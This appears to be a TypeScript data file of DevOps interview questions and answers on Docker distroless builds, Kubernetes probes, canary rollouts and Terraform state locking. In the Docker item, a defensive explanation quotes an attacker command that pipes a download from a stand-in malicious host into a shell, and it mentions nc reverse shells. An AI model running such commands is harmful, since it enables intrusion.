import { QuestionItem } from '../../types';

export const DEVOPS_CLOUD_QUESTIONS: QuestionItem[] = [
  {
    id: 'devops-1',
    slug: 'docker-multi-stage-builds-and-distroless',
    title: 'Docker Multi-Stage Builds & Distroless Containers: Shrinking Attack Surface & Image Footprint',
    questionText: 'How do you design a Dockerfile that slashes container image size from 1.2GB to 35MB for a production Node/Go application? Explain how multi-stage builds and distroless/scratch base images harden security against CVEs.',
    category: 'Cloud & Infrastructure',
    categoryId: 'devops-cloud',
    topicId: 'docker-containers',
    subtopicId: 'multi-stage-builds',
    difficulty: 'Medium',
    questionType: 'Practical Trade-off Analysis',
    roleTarget: 'DevOps Engineer',
    roleIds: ['devops-eng', 'cloud-eng', 'backend-dev'],
    estimatedTime: '4 mins response',
    estimatedMinutes: 4,
    description: 'Optimize Docker images using build-stage separation, layer caching best practices, non-root user execution, and minimal distroless runtime containers.',
    shortAnswer: 'Standard container builds inadvertently bundle development compilers, package managers (npm, pip, apt), bash shells, and build-time secrets into the final image, bloating size (1GB+) and multiplying vulnerability scan CVEs. A Multi-Stage Build solves this by using a heavyweight build image (e.g. `node:20-alpine` or `golang:1.22`) to compile dependencies, and then copying ONLY the compiled production artifacts and production dependencies into a minimal, stripped-down runtime image (such as `gcr.io/distroless/nodejs20` or Alpine). Distroless images contain no package managers and no shell (`/bin/sh`), preventing attackers who achieve remote code execution from spawning interactive shells or installing reconnaissance binaries.',
    detailedAnswer: '1. **The Flaw of Single-Stage Builds**:\n   `FROM node:20` installs a full Debian OS with gcc, python, curl, git, and apt. If an application contains an RCE vulnerability, the attacker can run `curl evil.com/malware | sh` or use `nc` for a reverse shell. Furthermore, pulling 1.2GB images across autoscaling Kubernetes nodes causes severe cold-start latency.\n\n2. **The 3 Multi-Stage Best Practices**:\n   - **Stage 1 (Dependencies & Build)**: Copy `package.json` and lockfile first to leverage Docker layer caching. Run `npm ci` and compile TypeScript `npm run build`.\n   - **Stage 2 (Pruning)**: Run `npm prune --production` to strip heavy devDependencies (vitest, typescript, linters).\n   - **Stage 3 (Distroless Runtime)**: Start `FROM gcr.io/distroless/nodejs20-debian12:nonroot`. Copy ONLY `/app/dist` and `/app/node_modules` from Stage 1/2.\n\n3. **Security Benefits of Distroless**:\n   - No shell (`/bin/bash` or `/bin/sh` does not exist).\n   - No package manager (`apt`, `apk`, `rpm` absent).\n   - Runs as non-root UID 65532 by default, preventing container breakout attacks.',
    codeExample: {
      language: 'dockerfile',
      code: `# syntax=docker/dockerfile:1
# -------------------------------------------------------------
# Stage 1: Build & Compile TypeScript
# -------------------------------------------------------------
FROM node:20-alpine AS builder
WORKDIR /app

# Cache dependencies layer
COPY package*.json ./
RUN npm ci

# Copy source and compile
COPY . .
RUN npm run build
RUN npm prune --production

# -------------------------------------------------------------
# Stage 2: Minimal Distroless Production Runtime
# -------------------------------------------------------------
FROM gcr.io/distroless/nodejs20-debian12:nonroot
WORKDIR /app

ENV NODE_ENV=production
# Copy only production artifacts from builder stage
COPY --from=builder /app/package.json ./
COPY --from=builder /app/node_modules ./node_modules
COPY --from=builder /app/dist ./dist

# Runs under non-root user 'nonroot' (UID 65532)
USER nonroot
EXPOSE 3000

CMD ["dist/main.js"]`,
      exampleInput: "Docker build executed on CI pipeline.",
      exampleOutput: "Final image size reduced from 1.34GB to 42MB; Trivy vulnerability scanner reports 0 critical/high CVEs."
    },
    commonMistakes: [
      'Copying the entire source code directory before `npm ci`, which invalidates the Docker cache layer on every minor code edit and forces full dependency re-downloads.',
      'Leaving images running as default `root` user (UID 0), granting root permissions on the host system if a container breakout CVE occurs.',
      'Baking environment secrets (`.env` files or API tokens) directly into intermediate Docker image layers.'
    ],
    realWorldUseCases: [
      'Kubernetes cluster autoscaling where nodes pull small 30MB images in 2 seconds instead of 45 seconds.',
      'Fintech and healthcare compliance requiring zero high/critical vulnerabilities in container registries.'
    ],
    tradeOffs: [
      'Distroless images prevent traditional `docker exec -it <container> /bin/sh` debugging in production. Developers must use ephemeral debug containers (`kubectl debug`) instead.'
    ],
    followUpQuestions: [
      'How does `kubectl debug` attach an ephemeral container with a shell to inspect a running distroless pod?',
      'What are Docker BuildKit cache mounts (`--mount=type=cache`) and how do they speed up CI package managers?'
    ],
    relatedQuestionIds: ['devops-2', 'devops-3', 'fs-3'],
    relatedTopicIds: ['docker-containers', 'devops-cloud', 'ci-cd-pipelines'],
    prerequisiteTopicIds: ['linux-fundamentals', 'git-fundamentals'],
    nextTopicIds: ['kubernetes-pods', 'container-security'],
    tags: ['DevOps', 'Docker', 'Multi-Stage', 'Distroless', 'Security', 'Containers'],
    keywords: ['docker', 'multi stage', 'distroless', 'alpine', 'cve', 'security', 'caching']
  },
  {
    id: 'devops-2',
    slug: 'kubernetes-pod-lifecycle-probes-and-graceful-termination',
    title: 'Kubernetes Pod Lifecycle: Readiness vs Liveness vs Startup Probes and Zero-Downtime Termination',
    questionText: 'What is the exact distinction between Kubernetes Startup, Liveness, and Readiness probes? How do you prevent dropped requests during pod rollouts and graceful shutdowns (SIGTERM)?',
    category: 'Cloud & Infrastructure',
    categoryId: 'devops-cloud',
    topicId: 'kubernetes',
    subtopicId: 'pod-lifecycle',
    difficulty: 'Hard',
    questionType: 'Technical Architecture',
    roleTarget: 'DevOps Engineer',
    roleIds: ['devops-eng', 'site-reliability-eng', 'backend-dev'],
    estimatedTime: '4 mins response',
    estimatedMinutes: 4,
    description: 'Master probe mechanics, kube-proxy endpoint removal timing, and graceful SIGTERM handling with preStop hooks for zero-downtime rolling updates.',
    shortAnswer: 'Kubernetes uses three distinct probes: 1) **Startup Probe**: Disables liveness/readiness checks until slow legacy or JVM boot logic finishes; 2) **Liveness Probe**: Determines if the application process has crashed or deadlocked; if it fails, kubelet KILLS and restarts the pod; 3) **Readiness Probe**: Determines if the pod is ready to accept incoming traffic; if it fails, the pod’s IP is removed from the Service Endpoints list (no traffic routed), but the pod is NOT killed. For zero-downtime termination, pods must handle `SIGTERM` gracefully while adding a `preStop` sleep hook (e.g. `sleep 10`) to allow `kube-proxy` across all cluster nodes to remove the pod IP from iptables before the process stops accepting sockets.',
    detailedAnswer: '1. **The Three Probes Explained**:\n   - **Startup Probe**: Guard for slow boots. If `failureThreshold: 30` and `periodSeconds: 10`, it gives the app 300s to initialize before killing it.\n   - **Liveness Probe**: Checks if app is alive. NEVER point liveness probes to external dependencies (e.g. database or Redis). If the database slows down, all liveness probes fail and Kubernetes simultaneously kills and restarts EVERY pod in your cluster, causing a catastrophic cascading outage.\n   - **Readiness Probe**: Verifies internal dependencies and capacity. If the database goes down or the node is warming its cache, fail readiness so traffic stops routing to this pod without restarting it.\n\n2. **The Zero-Downtime Termination Race Condition**:\n   When a pod is deleted (e.g. during a rolling deployment):\n   - Kube-apiserver sets pod state to `Terminating` and initiates two asynchronous actions in parallel:\n     1. Action A: Removes pod IP from EndpointSlice and signals `kube-proxy` on all nodes to update iptables/IPVS rules.\n     2. Action B: Sends `SIGTERM` to the container process in the pod.\n   - Because iptables propagation across a 100-node cluster takes 2 to 5 seconds, if the app terminates immediately on `SIGTERM`, clients whose requests were already in flight will receive `502 Bad Gateway` or `Connection Refused`.\n\n3. **The Solution: preStop Hook + Graceful Shutdown**:\n   Configure `preStop: exec: command: ["/bin/sh", "-c", "sleep 10"]`. This delays the `SIGTERM` by 10 seconds, guaranteeing all load balancers and iptables have removed the pod IP before the process stops accepting connections.',
    codeExample: {
      language: 'yaml',
      code: `apiVersion: apps/v1
kind: Deployment
metadata:
  name: api-service
spec:
  replicas: 3
  template:
    spec:
      containers:
      - name: api
        image: api-service:v2
        ports:
        - containerPort: 8080
        # 1. Delay SIGTERM to eliminate in-flight 502 connection drops
        lifecycle:
          preStop:
            exec:
              command: ["/bin/sh", "-c", "sleep 10"]
        # 2. Slow initialization guard
        startupProbe:
          httpGet:
            path: /health/startup
            port: 8080
          failureThreshold: 30
          periodSeconds: 5
        # 3. Process deadlock detection (do NOT check external DB here!)
        livenessProbe:
          httpGet:
            path: /health/live
            port: 8080
          periodSeconds: 10
          failureThreshold: 3
        # 4. Traffic gate: stops routing if app is overloaded or DB down
        readinessProbe:
          httpGet:
            path: /health/ready
            port: 8080
          periodSeconds: 5
          failureThreshold: 2
      # Ensure kubelet waits for preStop sleep + graceful drain
      terminationGracePeriodSeconds: 45`,
      exampleInput: "kubectl rollout restart deployment/api-service under 5,000 req/sec load.",
      exampleOutput: "Zero 502/504 errors; old pods drain existing connections while new pods accept traffic only after readiness succeeds."
    },
    commonMistakes: [
      'Checking external database or third-party API availability in the Liveness Probe, causing cluster-wide pod restart cascades during external outages.',
      'Omitting `terminationGracePeriodSeconds` when pods take longer than the default 30s to drain transactions.',
      'Not implementing a `preStop` sleep hook in high-traffic clusters, leading to intermittent 502 errors during deployments.'
    ],
    realWorldUseCases: [
      'Financial transaction processing pods completing in-flight Stripe webhooks before shutting down.',
      'High-throughput web services achieving 99.999% availability during continuous mid-day deployments.'
    ],
    tradeOffs: [
      'Adding a `preStop` sleep hook increases the time taken for a rolling deployment to complete, but guarantees zero dropped packets.'
    ],
    followUpQuestions: [
      'What is a PodDisruptionBudget (PDB) and how does it prevent cluster node upgrades from taking down critical services?',
      'How does Kube-Proxy in IPVS mode outperform iptables in clusters with over 5,000 services?'
    ],
    relatedQuestionIds: ['devops-1', 'devops-3', 'sd-1'],
    relatedTopicIds: ['kubernetes', 'devops-cloud', 'reliability-engineering'],
    prerequisiteTopicIds: ['docker-containers', 'linux-fundamentals'],
    nextTopicIds: ['service-mesh-istio', 'argo-rollouts'],
    tags: ['DevOps', 'Kubernetes', 'K8s', 'Probes', 'SRE', 'Zero Downtime'],
    keywords: ['kubernetes', 'probes', 'liveness', 'readiness', 'startup probe', 'sigterm', 'prestop', 'graceful shutdown']
  },
  {
    id: 'devops-3',
    slug: 'canary-vs-blue-green-deployment-strategies',
    title: 'Canary vs Blue-Green vs Rolling Deployments: Progressive Delivery with Automated Metric Rollback',
    questionText: 'Compare Blue-Green, Canary, and Rolling deployment strategies. How do you implement automated Canary progressive traffic shifting with Prometheus metric analysis and instant rollback?',
    category: 'Cloud & Infrastructure',
    categoryId: 'devops-cloud',
    topicId: 'ci-cd-pipelines',
    subtopicId: 'deployment-strategies',
    difficulty: 'Medium',
    questionType: 'Practical Trade-off Analysis',
    roleTarget: 'DevOps Engineer',
    roleIds: ['devops-eng', 'site-reliability-eng', 'cloud-eng'],
    estimatedTime: '4 mins response',
    estimatedMinutes: 4,
    description: 'Evaluate zero-downtime release models. Master Argo Rollouts / Flagger progressive delivery with automated latency and HTTP 5xx error rate analysis.',
    shortAnswer: 'Rolling deployments gradually replace old pods with new ones, requiring minimal extra compute but exposing all users to bugs if a regression slips through. Blue-Green deployments run two identical production environments (Blue = active, Green = idle new version) and swap the load balancer target instantly, offering rapid zero-downtime cutover and instant rollback, but requiring 2x infrastructure cost. Canary deployments release the new version to a small subset of live users (e.g. 5%), analyze real user traffic metrics (error rates, P99 latency via Prometheus), and progressively shift traffic (10%, 25%, 50%, 100%) or automatically abort and roll back if anomalies are detected.',
    detailedAnswer: '1. **Trade-offs Summary**:\n   - **Rolling**: Built into Kubernetes. Cost-effective (no duplicate infra), but rollback takes time to roll back pod-by-pod, and mixed versions run concurrently for minutes.\n   - **Blue-Green**: Fast cutover via router swap. Simple rollback (swap router back). Disadvantage: requires double the compute resources and doesn’t test with real live production traffic before the 100% switch.\n   - **Canary (Progressive Delivery)**: Golden standard for high scale. Limits blast radius of bugs to 1–5% of users. Powered by tools like Argo Rollouts or Flagger with Istio/Envoy.\n\n2. **Automated Canary Analysis (ACA)**:\n   Instead of human observation, an automated controller queries Prometheus during each step:\n   - Step 1: Set canary traffic weight to 5% for 10 minutes.\n   - Analysis: Query `sum(rate(http_requests_total{status=~"5.*", role="canary"}[5m])) / sum(rate(http_requests_total{role="canary"}[5m]))`.\n   - Condition: If 5xx rate > 0.5% OR P99 latency > 250ms, abort rollout, set weight back to 0%, and alert engineers on PagerDuty.\n   - If healthy: Step 2 advances weight to 20%, repeats analysis, and continues until 100%.',
    codeExample: {
      language: 'yaml',
      code: `apiVersion: argoproj.io/v1alpha1
kind: Rollout
metadata:
  name: payment-service
spec:
  replicas: 10
  strategy:
    canary:
      # Automated traffic analysis integration with Prometheus
      analysis:
        templates:
        - templateName: error-rate-check
        args:
        - name: service-name
          value: payment-service
      steps:
      - setWeight: 5
      - pause: { duration: 10m } # Hold at 5% and evaluate metrics
      - setWeight: 20
      - pause: { duration: 15m }
      - setWeight: 50
      - pause: { duration: 10m }
      # Automatically promotes to 100% if all metric checks pass

---
apiVersion: argoproj.io/v1alpha1
kind: AnalysisTemplate
metadata:
  name: error-rate-check
spec:
  metrics:
  - name: success-rate
    interval: 60s
    successCondition: result[0] >= 0.995 # 99.5% success rate required
    failureLimit: 2 # Abort rollout after 2 consecutive failed minutes
    provider:
      prometheus:
        address: http://prometheus:9090
        query: |
          sum(rate(http_requests_total{status!~"5.*", app="payment-service"}[1m])) 
          / 
          sum(rate(http_requests_total{app="payment-service"}[1m]))`,
      exampleInput: "New release contains unexpected memory leak or database deadlock.",
      exampleOutput: "Analysis fails at 5% traffic weight; Argo Rollouts instantly aborts and cuts traffic back to stable version with 0 customer impact."
    },
    commonMistakes: [
      'Not analyzing database schema backwards-compatibility. If a Canary migration deletes a database column that the stable 95% version still expects, both versions crash simultaneously (Expand and Contract pattern is required).',
      'Running Canary analysis on insufficient traffic volume, leading to false-positive rollback triggers.',
      'Performing manual releases without automated health metric gates.'
    ],
    realWorldUseCases: [
      'Netflix and Amazon rolling out streaming engine updates to 1% of users per AWS region.',
      'SaaS platforms deploying breaking UI changes behind feature flags and canary cohorts.'
    ],
    tradeOffs: [
      'Canary deployments require sophisticated routing infrastructure (Service Mesh, Ingress controllers like Envoy/Istio) and observability stacks (Prometheus/Datadog).'
    ],
    followUpQuestions: [
      'How does the Expand and Contract (Parallel Run) database migration pattern enable safe Blue-Green and Canary deployments?',
      'How do feature flags (LaunchDarkly) complement Canary deployments at the application layer?'
    ],
    relatedQuestionIds: ['devops-2', 'be-3', 'sd-1'],
    relatedTopicIds: ['ci-cd-pipelines', 'devops-cloud', 'monitoring-alerting'],
    prerequisiteTopicIds: ['kubernetes', 'git-branching'],
    nextTopicIds: ['service-mesh-istio', 'chaos-engineering'],
    tags: ['DevOps', 'CI/CD', 'Canary', 'Blue-Green', 'Argo Rollouts', 'Prometheus'],
    keywords: ['canary deployment', 'blue green', 'argo rollouts', 'progressive delivery', 'prometheus', 'rollback']
  },
  {
    id: 'devops-4',
    slug: 'terraform-state-locking-remote-backends-drift',
    title: 'Terraform State Architecture: S3 Backends, DynamoDB Locking, and Drift Remediation',
    questionText: 'Why is the Terraform state file (`terraform.tfstate`) sensitive and critical? How do remote backends with distributed state locking prevent state corruption, and how do you remediate configuration drift?',
    category: 'Cloud & Infrastructure',
    categoryId: 'devops-cloud',
    topicId: 'infrastructure-as-code',
    subtopicId: 'terraform-state',
    difficulty: 'Medium',
    questionType: 'Conceptual',
    roleTarget: 'DevOps Engineer',
    roleIds: ['devops-eng', 'cloud-eng', 'infrastructure-eng'],
    estimatedTime: '4 mins response',
    estimatedMinutes: 4,
    description: 'Master Terraform state mechanics: remote locking via AWS S3 + DynamoDB, secret handling, import pipelines, and drift detection.',
    shortAnswer: 'The Terraform state file (`terraform.tfstate`) is the single source of truth mapping declared declarative HCL code to real-world cloud resource IDs and attributes. If stored locally, team collaboration causes race conditions and state file overwrites. A Remote Backend (such as AWS S3 with a DynamoDB lock table or Terraform Cloud) solves this: 1) S3 provides centralized versioned storage with server-side encryption (KMS) to protect plaintext secrets stored in state; 2) DynamoDB acquires an atomic distributed lock via `LockID` whenever `terraform plan` or `apply` runs, rejecting concurrent executions and preventing state corruption; 3) Configuration drift (manual console edits) is detected via `terraform plan --refresh-only` and reconciled by updating HCL or applying state imports.',
    detailedAnswer: '1. **Why Terraform State Exists**:\n   Cloud APIs do not provide instantaneous dependency graphs or reverse lookups for metadata. State caches resource mappings (e.g. `aws_instance.web` -> `i-0abcdef12345`), tracks dependencies, and accelerates execution plans.\n\n2. **The Danger of State Corruption (Race Conditions)**:\n   If Engineer A and Engineer B run `terraform apply` concurrently in CI without locking, both read state version 4. Engineer A creates an RDS instance and writes state 5. Engineer B finishes creating an S3 bucket and overwrites state 5 with their version, wiping out the RDS instance from Terraform tracking (orphan resource).\n\n3. **The S3 + DynamoDB Locking Pattern**:\n   - When `terraform apply` begins, it inserts an item into DynamoDB: `{"LockID": {"S": "my-bucket/terraform.tfstate-md5"}}`.\n   - Any other engineer or CI runner receives an immediate error: `Error: Error acquiring the state lock: ConditionalCheckFailedException`.\n   - On completion, the lock item is deleted from DynamoDB.\n\n4. **Remediating Drift**:\n   When an operator manually changes an EC2 security group in the AWS Console, Terraform detects divergence between the real cloud state and `terraform.tfstate`. Running `terraform apply` restores the cloud configuration back to the declared HCL standard.',
    codeExample: {
      language: 'hcl',
      code: `# Production-Grade Terraform Remote Backend Configuration
terraform {
  required_version = ">= 1.5.0"

  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.0"
    }
  }

  backend "s3" {
    bucket         = "company-production-tfstate"
    key            = "core-infra/vpc/terraform.tfstate"
    region         = "us-east-1"
    encrypt        = true                  # Server-side KMS encryption for secrets
    dynamodb_table = "terraform-state-lock" # Distributed atomic mutex
  }
}

# DynamoDB Table Resource for State Locking
resource "aws_dynamodb_table" "tf_lock" {
  name         = "terraform-state-lock"
  billing_mode = "PAY_PER_REQUEST"
  hash_key     = "LockID"

  attribute {
    name = "LockID"
    type = "S"
  }
}`,
      exampleInput: "Two CI pipelines trigger 'terraform apply' simultaneously.",
      exampleOutput: "Pipeline 1 acquires DynamoDB lock; Pipeline 2 terminates gracefully with 'Error acquiring state lock'."
    },
    commonMistakes: [
      'Committing `terraform.tfstate` to Git repositories, exposing plaintext database passwords, private keys, and cloud credentials.',
      'Failing to enable S3 Bucket Versioning, eliminating rollback capabilities if a corrupt state file is written.',
      'Force-unlocking (`terraform force-unlock <id>`) a state lock without verifying whether another colleague or CI agent is actively running.'
    ],
    realWorldUseCases: [
      'Multi-team platform engineering managing shared VPCs and EKS clusters safely.',
      'Automated nightly drift detection alarms alerting engineers to unapproved manual AWS console changes.'
    ],
    tradeOffs: [
      'State files inevitably store database passwords and TLS private keys in plaintext JSON; strict KMS encryption and IAM RBAC on the S3 bucket are mandatory.'
    ],
    followUpQuestions: [
      'How does `terraform import` bring pre-existing unmanaged cloud resources under Terraform state management?',
      'What is the difference between Terraform modules and Terraform workspaces?'
    ],
    relatedQuestionIds: ['devops-1', 'devops-2', 'sd-1'],
    relatedTopicIds: ['infrastructure-as-code', 'devops-cloud', 'secrets-management'],
    prerequisiteTopicIds: ['git-fundamentals', 'aws-fundamentals'],
    nextTopicIds: ['terragrunt', 'driftctl'],
    tags: ['DevOps', 'Terraform', 'IaC', 'AWS', 'S3', 'DynamoDB', 'State Locking'],
    keywords: ['terraform', 'state locking', 's3', 'dynamodb', 'iac', 'infrastructure as code', 'drift']
  }
];
